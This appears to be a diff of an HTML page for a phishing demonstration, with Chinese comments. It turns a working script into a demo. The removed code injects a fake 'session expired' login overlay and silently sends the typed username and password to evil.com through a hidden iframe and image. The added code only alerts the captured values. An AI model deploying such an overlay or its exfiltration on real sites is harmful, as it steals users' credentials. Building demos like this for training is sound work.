@@ -1,66 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
+
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width">
-  <title>web</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phishing Demo - 1135</title>
+  <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .demo-content {
+      padding: 40px;
+      text-align: center;
+      color: var(--text-secondary);
+    }
+
+    .demo-placeholder {
+      background: var(--surface-color);
+      border: 1px dashed var(--border-color);
+      padding: 100px;
+      margin: 20px auto;
+      max-width: 800px;
+    }
+  </style>
 </head>
+
 <body>
+  <!-- 导航栏 -->
+  <div id="navigation-container"></div>
 
-  
-<h1>Page</h1>
-<h3>xxx</h3>
-  <br>
-  <br>
-  <br>
-  <br>
-<h3>xxx</h3>
-  <br>
-  <br>
-  <br>
-  <br>
-<button>按钮</button>
+  <div class="main-content">
+    <div class="demo-content">
+      <h1>Target Page Demo</h1>
+      <p>This page simulates a victim website.</p>
+      <div class="demo-placeholder">
+        <h3>Content Placeholder</h3>
+        <p>The phishing popup will appear over this content.</p>
+        <button class="btn">Dummy Button</button>
+      </div>
+    </div>
+  </div>
 
+  <!-- 加载统一导航栏 -->
+  <script src="../../js/main.js"></script>
+  <script>
+    // 加载导航栏
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', '../../navigation.html', true);
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        document.getElementById('navigation-container').innerHTML = xhr.responseText;
+      }
+    };
+    xhr.send();
 
-<script>
+    // Phishing Logic
+    function handle_login() {
+      // ----------------
+      // 获取内容
+      var user = document.querySelector("#tr_username").value;
+      var pass = document.querySelector("#tr_password").value;
+      var receiver_url = "http://evil.com/cred_data";
 
-function handle_login()
-{
-// ----------------
-// 获取内容
-var user = document.querySelector("#tr_username").value;
-var pass = document.querySelector("#tr_password").value;
-var receiver_url = "http://evil.com/cred_data";
+      // ----------------
+      // 发送内容
+      console.log("Phishing captured:", user, pass);
+      alert(`[Demo] Credentials captured:\nUser: ${user}\nPass: ${pass}\n\n(In a real attack, these would be sent to ${receiver_url})`);
 
-// ----------------
-// 发送内容
-// 发送内容 方式1: 创建iframe标签
-var iframe1=document.createElement("iframe"); //创建一个iframe 内联框架
-iframe1.style.display="none";   //设置样式 隐藏
-iframe1.src= receiver_url + "?user=" + user + "&pass=" + pass;
-document.body.appendChild(iframe1);
+      // ----------------
+      // 删除元素
+      var parent = document.getElementById("parent1");
+      var child = document.getElementById("child1");
+      if (parent && child) {
+        parent.removeChild(child);
+      }
+    }
 
-// 发送内容 方式2: 创建img标签
-var img1=new Image();
-img1.src=receiver_url + "?user=" + user + "&pass=" + pass;
-img1.style.display="none";   //设置样式 隐藏
-document.body.appendChild(img1);
-
-// 发送内容的方式较多 以上2种都经过了测试 可以无感知获取到表单数据 可以同时使用
-
-
-// ----------------
-// 删除元素
-var parent = document.getElementById("parent1");
-var child = document.getElementById("child1");
-parent.removeChild(child);
-}
-
-// ----------------
-// 画2个box
-// 一个是灰色半透明的大box 一个是诱导登录的小box
-document.body.innerHTML += '<div id="parent1"><div id="child1"><div id="grey_out_bg" style=" opacity: 0.5; background: #000; width: 100%;height: 100%; z-index: 99999999;top: 0; left: 0; position: fixed; "></div><div id="cred_box" style="font-family: Tahoma; background-color:#FFF; position: fixed; width: 500px; top: 50%; left: 50%; margin-top: -180px; margin-left: -250px; z-index: 999999999; box-shadow: 0 0 20px #000; border: 1px solid #000"><div id="error_message" style="width: 400px; margin: 20px auto; background-color: #ff9999; border: 1px solid red; font-weight:bold; padding:10px">Your session has expired, please login again!</div><div id="input_creds" style="width: 400px; margin: 20px auto;"><div style="font-weight:bold; width:100px; display:inline-block">Username:</div><input id="tr_username" style="width: 150px; padding: 5px; margin-bottom: 10px"type="text"><br><div style="font-weight:bold; width:100px; display:inline-block">Password:</div><input id="tr_password" style="width: 150px; padding: 5px; margin-bottom: 10px" type="password"><br><button type="button" onclick="handle_login()" style="margin: 10px 0 0 0; padding:10px 20px; width: 100px">Login</button></div></div></div></div>';
- </script>
-
+    // ----------------
+    // 画2个box
+    // 一个是灰色半透明的大box 一个是诱导登录的小box
+    // Delayed slightly to ensure page load
+    setTimeout(() => {
+      document.body.innerHTML += '<div id="parent1"><div id="child1"><div id="grey_out_bg" style=" opacity: 0.7; background: #000; width: 100%;height: 100%; z-index: 99999999;top: 0; left: 0; position: fixed; backdrop-filter: blur(2px);"></div><div id="cred_box" style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; background-color: #fff; position: fixed; width: 400px; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 999999999; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border-radius: 8px; overflow: hidden;"><div style="background: #f8f9fa; padding: 15px 20px; border-bottom: 1px solid #eee; font-weight: 600; color: #333;">Session Expired</div><div id="error_message" style="margin: 0; background-color: #fff3cd; color: #856404; padding: 10px 20px; font-size: 0.9rem; border-bottom: 1px solid #ffeeba;">Please login again to continue.</div><div id="input_creds" style="padding: 20px;"><div style="margin-bottom: 15px;"><label style="display: block; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Username</label><input id="tr_username" style="width: 100%; padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" type="text"></div><div style="margin-bottom: 20px;"><label style="display: block; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Password</label><input id="tr_password" style="width: 100%; padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" type="password"></div><button type="button" onclick="handle_login()" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500;">Login</button></div></div></div></div>';
+    }, 500);
+  </script>
 </body>
+
 </html>
